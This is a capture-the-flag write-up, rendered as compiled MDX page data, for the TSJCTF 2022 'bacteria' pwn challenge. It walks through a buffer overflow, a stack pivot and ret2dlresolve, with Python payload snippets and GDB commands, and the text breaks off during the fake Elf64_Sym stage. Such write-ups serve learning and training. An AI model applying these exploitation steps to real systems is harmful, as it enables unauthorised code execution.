{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var d=Object.create;var l=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var h=Object.getOwnPropertyNames;var m=Object.getPrototypeOf,u=Object.prototype.hasOwnProperty;var o=a=>l(a,\"__esModule\",{value:!0});var N=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),k=(a,s)=>{o(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},g=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let n of h(s))!u.call(a,n)&&n!==\"default\"&&l(a,n,{get:()=>s[n],enumerable:!(c=p(s,n))||c.enumerable});return a},b=a=>g(o(l(a!=null?d(m(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var r=N((S,i)=>{i.exports=_jsx_runtime});var x={};k(x,{default:()=>_,frontmatter:()=>w});var e=b(r()),w={title:\"TSJCTF 2022 \\u2013 bacteria\",date:\"2022-03-02\",draft:!1,authors:[\"Johnathan\"],tags:[\"TSJCTF 2022\",\"pwn\",\"Shell\",\"Buffer Overflow\",\"Binary Exploit\"],summary:\"Buffer overflow for shell.\",canonical:\"https://github.com/nhtri2003gmail/CTFNote/tree/master/writeup/2022/TSJ-CTF-2022/bacteria\"};function f(a={}){let{wrapper:s}=a.components||{};return s?(0,e.jsx)(s,Object.assign({},a,{children:(0,e.jsx)(c,{})})):c();function c(){let n=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",ul:\"ul\",li:\"li\",pre:\"pre\",code:\"code\",img:\"img\",strong:\"strong\",ol:\"ol\",hr:\"hr\",h3:\"h3\"},a.components),{TOCInline:t}=n;return t||y(\"TOCInline\",!0),(0,e.jsxs)(e.Fragment,{children:[(0,e.jsxs)(n.h2,{id:\"bacteria\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#bacteria\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"bacteria\"]}),`\n`,(0,e.jsx)(t,{toc:a.toc,exclude:[\"bacteria\"],toHeading:3}),`\n`,(0,e.jsxs)(n.p,{children:[\"Origin challenge link: \",(0,e.jsx)(n.a,{href:\"https://chal.ctf.tsj.tw/\",children:\"https://chal.ctf.tsj.tw/\"}),\" (closed)\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"You can also download challenge file in repo: \",(0,e.jsx)(n.a,{href:\"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/TSJ-CTF-2022/bacteria/bacteria.tar.gz\",children:\"bacteria.tar.gz\"})]}),`\n`,(0,e.jsx)(n.p,{children:\"There will be several files in tar as follows:\"}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsx)(n.li,{children:\"bacteria/docker-compose.yml\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/Dockerfile\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/xinetd\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/bacteria\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/flag\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/getflag\"}),`\n`,(0,e.jsx)(n.li,{children:\"bacteria/share/run.sh\"}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Download the tar and untar it, then build with the following command (require \",(0,e.jsx)(n.a,{href:\"https://docs.docker.com/compose/install/\",children:\"docker-compose\"}),\"):\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`docker-compose build && docker-compose up\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"And now we\\u2019re ready for the exploitation!\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"1-find-bug\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#1-find-bug\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"1. Find bug\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we will use \",(0,e.jsx)(n.code,{children:\"file\"}),\" to check for basic information (outside docker container):\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"file\"}),` bacteria\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"bacteria: ELF \",(0,e.jsx)(n.span,{className:\"token number\",children:\"64\"}),\"-bit LSB executable, x86-64, version \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"SYSV\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, stripped\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So this is a 64-bit file being stripped, it will be hard when we need to debug. Next, we will use \",(0,e.jsx)(n.code,{children:\"checksec\"}),\" to check for all defences:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`$ checksec bacteria\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Nice! We can see that just \",(0,e.jsx)(n.code,{children:\"NX enabled\"}),\" which means we cannot execute assembly shellcode on stack. Finally, we will use \",(0,e.jsx)(n.code,{children:\"objdump\"}),\" to dump the assembly code of file.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"This is a small binary with just a few assembly code as below:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/objdump.png\",alt:\"objdump.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we have \",(0,e.jsx)(n.code,{children:\"read@plt\"}),\", \",(0,e.jsx)(n.code,{children:\"read@got\"}),\" and \",(0,e.jsx)(n.code,{children:\".text\"}),\" part. In \",(0,e.jsx)(n.code,{children:\".text\"}),\", it first read in 0x20 byte to the current rsp and then set the null byte after that input. Finally it add rsp with 0x10 and return.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So that\\u2019s means we have the \",(0,e.jsx)(n.strong,{children:\"Buffer Overflow\"}),\" bug and that\\u2019s all, we cannot find anything else. So let\\u2019s move on the next part: Brainstorming!\"]}),`\n`,(0,e.jsxs)(n.h2,{id:\"2-brainstorming\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#2-brainstorming\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"2. Brainstorming\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, we have the \",(0,e.jsx)(n.strong,{children:\"Buffer Overflow\"}),\" bug but because the space for our payload is too small so I intent to do a stack pivot first. But the challenge file has \",(0,e.jsx)(n.code,{children:\"NX enabled\"}),\" so we cannot execute assembly shellcode on it. Also because the binary is small, we don\\u2019t have any gadget to conduct a full ROPgadget or even just a part of ROPgadget.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"But we have \",(0,e.jsx)(n.code,{children:\"read@plt\"}),\", which means it will need to resolve the libc address for the first time. So we have the dlresolver function, all we need now is a \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\". If you don\\u2019t know what it is, you can read \",(0,e.jsx)(n.a,{href:\"https://github.com/nhtri2003gmail/ret2dlresolve-64bit\",children:\"here\"}),\".\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"First, this is a 64-bit file so using \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\" technique may work and may not work for some special case. And we can conduct this technique by 2 ways: faking \",(0,e.jsx)(n.code,{children:\"link_map\"}),\" or faking \",(0,e.jsx)(n.code,{children:\"reloc_arg\"})]}),`\n`,(0,e.jsxs)(n.p,{children:[\"In this challenge, I know that we can fake \",(0,e.jsx)(n.code,{children:\"reloc_arg\"}),\" because the base address of binary is \",(0,e.jsx)(n.code,{children:\"0x400000\"}),\" so \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\" will not cause error (if base address is \",(0,e.jsx)(n.code,{children:\"0x600000\"}),\", the check function of dlresolver will cause error), also because we don\\u2019t have any thing to leak \",(0,e.jsx)(n.code,{children:\"link_map\"}),\" and to overwrite \",(0,e.jsx)(n.code,{children:\"link_map\"}),\" data.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"So first, we will try to fake some structures to conduct \",(0,e.jsx)(n.code,{children:\"ret2dlresolve\"}),\" to execute whatever function we want. Next, we will try to leak the libc address and then use one gadget to get shell.\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[\"Summary:\",`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Fake structure of Elf64_Sym\"}),`\n`,(0,e.jsx)(n.li,{children:\"Fake structure of Elf64_Rela\"}),`\n`,(0,e.jsx)(n.li,{children:\"Fake STRTAB\"}),`\n`,(0,e.jsx)(n.li,{children:\"Conduct ret2dlresolve\"}),`\n`,(0,e.jsx)(n.li,{children:\"Get shell\"}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h2,{id:\"3-exploit\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#3-exploit\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"3. Exploit\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Before we continue our exploit, I write this function to attach gdb to the process of bacteria:\"}),`\n`,(0,e.jsxs)(\"details\",{children:[(0,e.jsx)(\"summary\",{children:\"Code snippet\"}),(0,e.jsx)(\"p\",{children:(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"GDB\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tproc \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'ps'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'aux'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" stdout\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"PIPE\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tps \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" proc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"stdout\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"for\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" ps\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'/home/bacteria/bacteria'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"and\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'timeout'\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"not\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"in\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\t\",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change the split to get the correct pid\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tpid \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" i\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'    '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"split\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'  '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"decode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\t\tlog\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Process pid: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"str\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tcommand \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`'''\n`})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*0x401040\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:\"\t'''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"with\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'wt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"as\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t        f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"write\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"command\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tsubprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'sudo'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/usr/bin/x-terminal-emulator'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'--geometry'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'960x1080+960+0'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-p'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-x'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# input() to make program wait with gdb\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" connect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'127.0.0.1'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"9487\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"GDB\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})})})]}),`\n`,(0,e.jsx)(n.p,{children:\"And remember these GDB command to check for JMPREL, SYMTAB and STRTAB:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/3xg   (JMPREL) + (reloc_arg) * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  p/x     (r_info) >> 32     # symbol_number\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/3xg   (SYMTAB) + (symbol_number) * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`gef\\u27A4  x/s     (STRTAB) + (st_name)\n`})]})}),`\n`,(0,e.jsx)(n.hr,{}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-1-stack-pivot\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-1-stack-pivot\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 1: Stack pivot\"]}),`\n`,(0,e.jsx)(n.p,{children:\"First, let\\u2019s attach gdb to the process of bacteria in the container to get the read & write section so that we can do stack pivot:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_rw_section.png\",alt:\"get_rw_section.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So we know that at address from \",(0,e.jsx)(n.code,{children:\"0x403000\"}),\" to \",(0,e.jsx)(n.code,{children:\"0x404000\"}),\", the binary is writable. So we will choose an address of \",(0,e.jsx)(n.code,{children:\"0x403e00\"}),\" to stack pivot. Why I choose \",(0,e.jsx)(n.code,{children:\"0x403e00\"}),\", because after the stack pivot, we will conduct the ret2dlresolve, which will need a lot of lower memory to resolve libc address. Choosing \",(0,e.jsx)(n.code,{children:\"0x403e00\"}),\" so we don\\u2019t need to change a lot.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"To do the stack pivot, we also need a \",(0,e.jsx)(n.code,{children:\"leave; ret\"}),\" gadget to change the rsp. But because we will execute the \",(0,e.jsx)(n.code,{children:\".text\"}),\" again so we have \",(0,e.jsx)(n.code,{children:\"leave; ret\"}),\" already. One more thing to notice is that after we stack pivot, the new stack now is inside the binary which doesn\\u2019t have any thing for us to work around. So before we do the stack pivot, we need to write something to the chosen address first.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"As we know that the program will first mov the current rsp to rbp and then mov rbp to rsi and write to rsi. So we just need \",(0,e.jsx)(n.code,{children:\"mov rsi, rbp\"}),\" to write to our desired address passed to rsi by rbp. Our first payload will be as following:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x403e00\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"mov_rsi_rbp_read \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401027\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\"                 \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Just for padding so that we don\\u2019t need to sleep()\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running script and we stop at ret, we can see that it\\u2019s ready for the next input of 0x20 bytes to the rw_section (by looking at rbp)\"}),`\n`,(0,e.jsxs)(n.p,{children:[`Status of rbp:\n`,(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/rw_section_rbp.png\",alt:\"rw_section_rbp.png\"})]}),`\n`,(0,e.jsxs)(n.p,{children:[`Status of code:\n`,(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/rw_section_code.png\",alt:\"rw_section_code.png\"})]}),`\n`,(0,e.jsx)(n.p,{children:\"That\\u2019s look good! Just leave it here for a while and we will continue building exploit later.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-2-fake-address-and-structure-of-elf64_sym\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-2-fake-address-and-structure-of-elf64_sym\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 2: Fake address and structure of Elf64_Sym\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The reason why I fake Elf64_Sym structure first is because with the address of Elf64_Sym structure, we can calculate the symbol_number and the other stuff.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"So first, we will choose an address for Elf64_Sym so that \",(0,e.jsx)(n.code,{children:\"symbol_numer\"}),\" is an integer:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`    <Address of Elf64_Sym> = <SYMTAB> + <symbol_number> * 24\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`<=> <symbol_number> = ( <Address of Elf64_Sym> - <SYMTAB> ) / 24\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"After a first trying, we know that we can use the address of rw_section to write our fake Elf64_Sym struct. So now we have:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`SYMTAB = 0x400290\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Elf64_Sym_addr  = rw_section                             = 0x403e00\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`symbol_number   = int(( Elf64_Sym_addr - SYMTAB ) / 24)  = 634\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Now, we will create a fake struct for Elf64_Sym. The structure of Elf64_Sym is defined as follows:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-c\",children:(0,e.jsxs)(n.code,{className:\"language-c code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"typedef\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"struct\"}),\" \",(0,e.jsx)(n.span,{className:\"token class-name\",children:\"elf64_sym\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    Elf64_Word st_name\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"       \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Symbol name, index in string table (4 bytes)*/\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"char\"}),\" st_info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* Type and binding attributes (1 